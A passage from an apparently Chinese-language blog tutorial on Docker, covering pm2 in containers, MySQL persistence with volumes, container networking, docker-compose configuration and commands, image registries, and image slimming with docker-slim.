/app/</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install pm2 -g</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm i</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3001</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;app.js&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>重新打包一个镜像并运行，重新打开浏览器，修改 app.js 文件内 ctx.body &#x3D; ‘pm2 start’</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker build -t xuan/hello .</span><br><span class="line">docker run -p 3001:3001 -v /Users/xuan/Desktop/hello/koa2Docker:/app xuan/hello</span><br><span class="line"><span class="comment"># log</span></span><br><span class="line">2021-01-29T12:17:52: PM2 <span class="built_in">log</span>: Launching <span class="keyword">in</span> no daemon mode</span><br><span class="line">2021-01-29T12:17:52: PM2 <span class="built_in">log</span>: [Watch] Start watching app</span><br><span class="line">2021-01-29T12:17:52: PM2 <span class="built_in">log</span>: App [app:0] starting <span class="keyword">in</span> -fork mode-</span><br><span class="line">2021-01-29T12:17:52: PM2 <span class="built_in">log</span>: App [app:0] online</span><br><span class="line">已启动3001</span><br></pre></td></tr></table></figure><p><code>command + R</code> 刷新浏览器，发现内容已经修改<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611923103974-4e8ce0cc-1df0-4895-96a0-598dca842be2.png#height=87&id=MBfR8&originHeight=87&originWidth=333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5001&status=done&style=none&title=&width=333" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611923103974-4e8ce0cc-1df0-4895-96a0-598dca842be2.png#height=87&id=MBfR8&originHeight=87&originWidth=333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5001&status=done&style=none&title=&width=333" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="FiOlw"></a></p><h4 id="额外关注"><a href="#额外关注" class="headerlink" title="额外关注"></a>额外关注</h4><p>突发奇想一下，从创建 app 应用到最终通过端口号访问服务，其实是<strong>没有任何依赖于宿主机的开发环境</strong>的，也就是说，<strong>在本机上，只要有 docker 环境，就可以进行正常业务的开发</strong></p><p>这也是 docker 带来的便利之处<br><a name="rMYlu"></a></p><h3 id="mysql-持久存储案例"><a href="#mysql-持久存储案例" class="headerlink" title="mysql 持久存储案例"></a>mysql 持久存储案例</h3><p>docker 一般情况下推荐一个 container 只做一件事情，这样即使一个容器挂了也很容易回复和查找原因，所以通常会用单独的容器运行 mysql</p><p>这里也就会遇到前文所说的问题： <br />镜像是无状态的，重新启动 image 的时候数据库保存的信息不会保留，不符合持久存储的预期</p><p>所以需要将数据库的 data 在宿主机同时保存一份，这样重新启动的时候会将本地的库同步到新的容器之中</p><p><a name="1OILg"></a></p><h4 id="文件映射-1"><a href="#文件映射-1" class="headerlink" title="文件映射"></a>文件映射</h4><p>这里为了讲解方便直接用了 docker-compose 配置文件说明，这里不用太抠细节，后续会将 docker-compose，可以找到 volumes 一行  <code>./mysql-data:/var/lib/mysql</code>，<br />将当前目录下的 mysql-data 和容器里的&#x2F;var&#x2F;lib&#x2F;mysql 进行关联</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">xuanlazy/koa:0.0.6</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3001</span><span class="string">:3001</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/app</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./:/app</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_HOST:</span> <span class="string">mysql</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">MYSQL_DB:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">sql</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3307</span><span class="string">:3306</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./db:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">test</span></span><br></pre></td></tr></table></figure><p>启动服务后，发现当前目录下多了一个 db 文件夹，可以看到已经把当前 mysql 整库拖出来<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611924465137-435929f3-20ee-4946-a89d-893cdbbe4e59.png#height=484&id=Mpn6z&originHeight=484&originWidth=365&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24982&status=done&style=none&title=&width=365" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611924465137-435929f3-20ee-4946-a89d-893cdbbe4e59.png#height=484&id=Mpn6z&originHeight=484&originWidth=365&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24982&status=done&style=none&title=&width=365" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="hXsqG"></a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>在 mysql 里创建一个表，并且插入数据，下面是现成的的 sql：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 创建表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> runoob_tbl (</span><br><span class="line">        runoob_id <span class="type">INT</span> UNSIGNED AUTO_INCREMENT,</span><br><span class="line">        runoob_title <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">        runoob_author <span class="type">VARCHAR</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">        submission_date <span class="type">DATE</span>,</span><br><span class="line">        <span class="keyword">PRIMARY</span> KEY ( runoob_id )</span><br><span class="line">)ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"># 插入数据</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> runoob_tbl</span><br><span class="line">    (runoob_title, runoob_author, submission_date)</span><br><span class="line">    <span class="keyword">VALUES</span></span><br><span class="line">    (&quot;学习Dcoker&quot;, &quot;test&quot;, NOW())</span><br><span class="line"></span><br><span class="line"># 查询<span class="keyword">sql</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl;</span><br></pre></td></tr></table></figure><p>存储成功后，停掉服务，重启的时候可以试下注释掉 volumes，看下区别（这里操作比较复杂信息量也少就不具挂例子了）<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612151638862-a7c6b418-dbbe-466c-9c3d-0fb4a088226c.png#height=48&id=D6DNg&originHeight=48&originWidth=304&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4648&status=done&style=none&title=&width=304" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612151638862-a7c6b418-dbbe-466c-9c3d-0fb4a088226c.png#height=48&id=D6DNg&originHeight=48&originWidth=304&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4648&status=done&style=none&title=&width=304" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>其实答案应该也猜得到，有挂 volumes 的情况下之前存的数据可以再次查询到，注释掉的情况下相当于启用的是一个新数据库</p><p><a name="rdY0e"></a></p><h1 id="进阶：多容器组合联动"><a href="#进阶：多容器组合联动" class="headerlink" title="进阶：多容器组合联动"></a>进阶：多容器组合联动</h1><p><a name="wRn2L"></a></p><h2 id="为什么要多容器联动？"><a href="#为什么要多容器联动？" class="headerlink" title="为什么要多容器联动？"></a>为什么要多容器联动？</h2><p><a href="https://docs.docker.com/get-started/07_multi_container/">官方文档</a>有写：</p><ul><li>很有可能需要以与数据库不同的方式扩展 API 和前端</li><li>单独的容器可让您隔离版本和更新版本</li><li>虽然您可以在本地使用数据库的容器，但可能要在生产环境中使用数据库的托管服务。然后，您不想随应用程序一起提供数据库引擎</li><li>运行多个进程将需要一个进程管理器（容器仅启动一个进程），这增加了容器启动&#x2F;关闭的复杂性</li></ul><p>所以通常针对一个服务拆成多个容器，例如：koa + mysql + nginx 服务，通常会分成 koa，mysql，nginx 三个容器，那么 docker 作为容器是完全使用沙箱机制，相互之间不会有任何接口，那么怎么进行联动呢？</p><p><a name="3Qfy5"></a></p><h2 id="network"><a href="#network" class="headerlink" title="network"></a>network</h2><p>其实 docker 提供了 network 能力，当两个容器在同一个网络的情况下就可以进行通讯，<br />使用 <code>docker network ls</code> 查看当前网络状况，默认情况下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">e6a4baa5f217   bridge    bridge    <span class="built_in">local</span></span><br><span class="line">66a3ddcbaa06   host      host      <span class="built_in">local</span></span><br><span class="line">5d3adcd8922e   none      null      <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p>具体含义可以查询 <a href="https://docs.docker.com/network/">network 文档</a> ，<br />对于实际应用来说可以通过<code>docker network create test-app</code>新建一个新的网络</p><p>验证一下，分别用以下两条命令分别启动两台容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一会进入的主机</span></span><br><span class="line">docker run -d</span><br><span class="line">--network test-app           <span class="comment"># 使用test-app 网络</span></span><br><span class="line">--network-alias start-1      <span class="comment"># 网络名start-1</span></span><br><span class="line">--name test-host             <span class="comment"># 容器名</span></span><br><span class="line">docker/getting-started</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子服务</span></span><br><span class="line">docker run -d</span><br><span class="line">--network test-app</span><br><span class="line">--network-alias start-2</span><br><span class="line">--name test-child</span><br><span class="line">docker/getting-started</span><br></pre></td></tr></table></figure><p>此时进入容器看一下， <code>docker exec -it test-host /bin/sh</code> ，找到开启的子服务网络别名 start-2，直接用 ping 就好了<code>ping start-2</code> ，可以看到已经链接成功<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612242375753-c5f94fd9-00a4-4e4e-95a5-57a02b3b045d.png#height=112&id=ig788&originHeight=112&originWidth=325&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10120&status=done&style=none&title=&width=325" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612242375753-c5f94fd9-00a4-4e4e-95a5-57a02b3b045d.png#height=112&id=ig788&originHeight=112&originWidth=325&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10120&status=done&style=none&title=&width=325" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>通过启动容器时指定 <code>--network</code>  可以让很方便的建立容器和容器之间的链接，例如 mysql 和应用的通讯</p><p>但是另一面每次都需要启动容器时手动指定 network，公开 port，挂载 volume 实在是有点累，且不方便规模化（可复制），这时候就需要 docker compose，帮进行组装</p><p><a name="F9RFO"></a></p><h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker compose"></a>docker compose</h2><p><a name="P8cVM"></a></p><h3 id="什么是-docker-compose？"><a href="#什么是-docker-compose？" class="headerlink" title="什么是 docker compose？"></a>什么是 docker compose？</h3><p>官方给的定义： Compose is a tool for defining and running multi-container Docker applications. With Compose, you use a YAML file to configure your application’s services. Then, with a single command, you create and start all the services from your configuration.</p><p>翻译下其实就是，用于定义和运行多容器 Docker 应用程序的工具，通过 YAML 文件来配置应用程序的服务，使用一个命令读取配置并创建启动所有服务</p><p><a name="JzO5t"></a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>关于安装如果是最新的 docker desktop 是自带的， <code>docker-compose version</code> 就可以查看版本号</p><p><a name="yDTao"></a></p><h3 id="解读配置文件"><a href="#解读配置文件" class="headerlink" title="解读配置文件"></a>解读配置文件</h3><p>想了想，还是通过配置文件反推比较好理解一些，下面便是一个简单的 node + mysql 的配置文件,来看看它到底做了哪些事？</p><p>docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.7&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">test</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3001</span><span class="string">:3001</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/app</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./:/app</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_HOST:</span> <span class="string">sql</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">test123456</span></span><br><span class="line">      <span class="attr">MYSQL_DB:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">sql</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3307</span><span class="string">:3306</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/usr/local/var/mysql:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">test123456</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">test</span></span><br></pre></td></tr></table></figure><p>version – 定义当前配置文件所使用的文件格式版本，不同的版本可能会存在兼容问题，<a href="https://docs.docker.com/compose/compose-file/">具体文档</a><br />services – 服务列表<br />app – 定义单例服务<br />image –所用镜像<br />container_name –容器名<br />ports –端口映射<br />working_dir –工作目录，等同于 Dockerfile 中的 workdir<br />volumes – 等同于 docker run -v <br />environment – 设置环境变量</p><p>更多配置信息: <a href="https://docs.docker.com/compose/compose-file/compose-file-v3/">https://docs.docker.com/compose/compose-file/compose-file-v3/</a></p><p><a name="L02Dl"></a></p><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>其实在 services 下的配置服务，大致可以理解为将 dockerfile 和 docker run 的很多信息展示在一个配置表中，例如 -v, -p，working_dir，方便统一管理</p><p>依旧是使用刚才的配置表，执行<code>docker-compose up</code>即可启动服务，通过 desktop 查看<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612327541583-f26025e9-7fce-4246-9aa3-b1d22c4fef76.png#height=392&id=idoXF&originHeight=392&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27043&status=done&style=none&title=&width=816" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612327541583-f26025e9-7fce-4246-9aa3-b1d22c4fef76.png#height=392&id=idoXF&originHeight=392&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27043&status=done&style=none&title=&width=816" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>这里需要注意一点 docker-compose 之所以能够让多个容器互相通信连在一起，并不是有多特殊，而是帮忙做了一些事情，例如创建网络<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612327021345-730ee1d6-3830-4ba6-abd4-7859b00214c0.png#height=69&id=lMHzm&originHeight=69&originWidth=392&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7942&status=done&style=none&title=&width=392" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612327021345-730ee1d6-3830-4ba6-abd4-7859b00214c0.png#height=69&id=lMHzm&originHeight=69&originWidth=392&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7942&status=done&style=none&title=&width=392" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />可以看到提示信息第一条就是 create network “test_node_default”，通过<code>docker network list</code>查看，确实是新加了一条网络<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612327158020-b6cacad7-ce2f-4a86-8ef5-95f2f3720161.png#height=88&id=a88wr&originHeight=88&originWidth=305&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9953&status=done&style=none&title=&width=305" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612327158020-b6cacad7-ce2f-4a86-8ef5-95f2f3720161.png#height=88&id=a88wr&originHeight=88&originWidth=305&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9953&status=done&style=none&title=&width=305" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="1b3zM"></a></p><h3 id="常用指令整理"><a href="#常用指令整理" class="headerlink" title="常用指令整理"></a>常用指令整理</h3><ul><li>docker-compose up –部署应用，添加-d 参数可以后台运行</li><li>docker-compose stop –停止所有应用</li><li>docker-compose rm –删除已停止的应用，但不会清除 volumes &#x2F; 镜像 &#x2F; 网络</li><li>docker-compose restart –重启应用</li><li>docker-compose down –停止并删除运行中的应用</li><li>docker-compose ps –显所有容器示</li></ul><p>更多指令：<a href="https://docs.docker.com/compose/reference/overview/">https://docs.docker.com/compose/reference/overview/</a></p><p><a name="kGE9N"></a></p><h3 id="一些案例"><a href="#一些案例" class="headerlink" title="一些案例"></a>一些案例</h3><p><a name="WV1qg"></a></p><h4 id="链接-mongoDB"><a href="#链接-mongoDB" class="headerlink" title="链接 mongoDB"></a>链接 mongoDB</h4><p>docker-compose 启动容器虽然在同一 network 下，但是容器间的 ip 还是不一样的，无法直接用 127.0.0.1 &#x2F; 0.0.0.0 链接，需要修改一下 url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongodb://root:mongodb@mongodb:27017/admin</span><br></pre></td></tr></table></figure><p><a name="NZKgw"></a></p><h1 id="DockerFile-配置详解"><a href="#DockerFile-配置详解" class="headerlink" title="DockerFile 配置详解"></a>DockerFile 配置详解</h1><p>官方文档： <a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a><br />DockerFile 最佳实践： <a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/">https://docs.docker.com/develop/develop-images/dockerfile_best-practices&#x2F;</a></p><p><a name="f7o58"></a></p><h1 id="DockerHub-远程仓库"><a href="#DockerHub-远程仓库" class="headerlink" title="DockerHub 远程仓库"></a>DockerHub 远程仓库</h1><p>官方文档： <a href="https://www.docker.com/products/docker-hub">https://www.docker.com/products/docker-hub</a><br />Docker Hub 是 Docker 官方提供的托管存储库服务，用于与团队查找和共享容器映像。主要功能包括：</p><ul><li>专用存储库：推拉容器图像</li><li>自动化构建：自动从 GitHub 和 Bitbucket 构建容器映像并将其推送到 Docker Hub</li><li>团队和组织：管理对私有存储库的访问</li><li>官方映像：提取并使用 Docker 提供的高质量容器映像</li><li>发布者图像：拉出并使用外部供应商提供的高质量容器图像。认证映像还包括支持并保证与 Docker Enterprise 的兼容性</li><li>Webhooks：成功推送到存储库以将 Docker Hub 与其他服务集成后触发动作</li></ul><p>其实有点类似于 github，默认 pull 的镜像源其实就于 dockerhub，也可以 push 自己的镜像到线上<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612333810974-37a2a01d-d0ef-4ead-9b68-5291b394edae.png#height=346&id=dkLz5&originHeight=346&originWidth=1279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43904&status=done&style=none&title=&width=1279" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612333810974-37a2a01d-d0ef-4ead-9b68-5291b394edae.png#height=346&id=dkLz5&originHeight=346&originWidth=1279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43904&status=done&style=none&title=&width=1279" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="XMDf0"></a></p><h2 id="配置仓库"><a href="#配置仓库" class="headerlink" title="配置仓库"></a>配置仓库</h2><p><a name="UpQsf"></a></p><h3 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h3><p>如果是生产环境的话，还是推荐建一个私有仓库用来进行托管，这里使用的是阿里云的容器镜像服务，应该是免费的，可以自己看下<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612334146137-f5c60160-39c5-45d6-86ef-215b99f9fdd2.png#height=331&id=VnIAc&originHeight=331&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29883&status=done&style=none&title=&width=686" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612334146137-f5c60160-39c5-45d6-86ef-215b99f9fdd2.png#height=331&id=VnIAc&originHeight=331&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29883&status=done&style=none&title=&width=686" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="nCInf"></a></p><h3 id="docker-Registry"><a href="#docker-Registry" class="headerlink" title="docker Registry"></a>docker Registry</h3><p>官方文档：<a href="https://docs.docker.com/registry/">https://docs.docker.com/registry/</a></p><p>貌似可以通过 registry 镜像搭建私人仓库，还没试过</p><p><a name="5kNcS"></a></p><h1 id="docker-slim-镜像压缩"><a href="#docker-slim-镜像压缩" class="headerlink" title="docker-slim 镜像压缩"></a>docker-slim 镜像压缩</h1><p>这个是关于 docker 镜像的压缩工具，可以帮助制作 slim 版本的镜像，仓库地址：<a href="https://github.com/docker-slim/docker-slim">点击这里</a></p><p><a name="bV50D"></a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先看下官方介绍，大致的意思不需要任何额外的操作，就可以获得最小的镜像，并且给出了个比较夸张的数字，优化 30 倍，看了下 github 有了 9.6k，还是比较可靠的<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612170500155-d3e37a6b-d47c-4e88-805b-76efe2647af1.png#height=195&id=L8xQu&originHeight=195&originWidth=733&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100695&status=done&style=none&title=&width=733" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612170500155-d3e37a6b-d47c-4e88-805b-76efe2647af1.png#height=195&id=L8xQu&originHeight=195&originWidth=733&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100695&status=done&style=none&title=&width=733" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="7U81Q"></a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>官方介绍：<code>docker-slim</code> will optimize and secure your containers by understanding your application and what it needs using various analysis techniques.</p><p>按官方文档来解释，docker-slim 是通过依赖分析干掉镜像中没有产生使用的文件&#x2F;内容，从而节约体积</p><p><a name="fVGpb"></a></p><h2 id="试用测评"><a href="#试用测评" class="headerlink" title="试用测评"></a>试用测评</h2><p>将刚才的 demo 用来做下实验，效果确实比较惊人</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:dubnium-buster-slim</span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> . /app/</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm config <span class="built_in">set</span> registry http://registry.npm.taobao.org  &amp;&amp; npm install pm2 -g &amp;&amp; npm i</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3001</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;./app.js&quot;</span>, <span class="string">&quot;--watch&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>一个简单的 dockerfile 打包完之后，之前的情况下是 588.52MB，打包后缩小了 11 倍以上，默默收藏<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612170858696-07d50b71-74de-4ebd-896c-ec3153723508.png#height=248&id=B4rdA&originHeight=248&originWidth=1820&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41851&status=done&style=none&title=&width=1820" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612170858696-07d50b71-74de-4ebd-896c-ec3153723508.png#height=248&id=B4rdA&originHeight=248&originWidth=1820&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41851&status=done&style=none&title=&width=1820" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="QbGby"></a></p><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>下载地址: <a href="https://github.com/docker-slim/docker-slim/releases">https://github.com/docker-slim/docker-slim/releases</a><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612172423751-0cdcce71-6262-4acf-b775-92622e7a3c1a.png#height=90&id=o8QDH&originHeight=90&originWidth=1198&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18311&status=done&style=none&title=&width=1198" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612172423751-0cdcce71-6262-4acf-b775-92622e7a3c1a.png#height=90&id=o8QDH&originHeight=90&originWidth=1198&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18311&status=done&style=none&title=&width=1198" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612172998730-15df8c10-776b-4d2c-a847-255fc4451102.png#height=49&id=ypKU3&originHeight=49&originWidth=735&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12899&status=done&style=none&title=&width=735" class="lazyload placeholder" 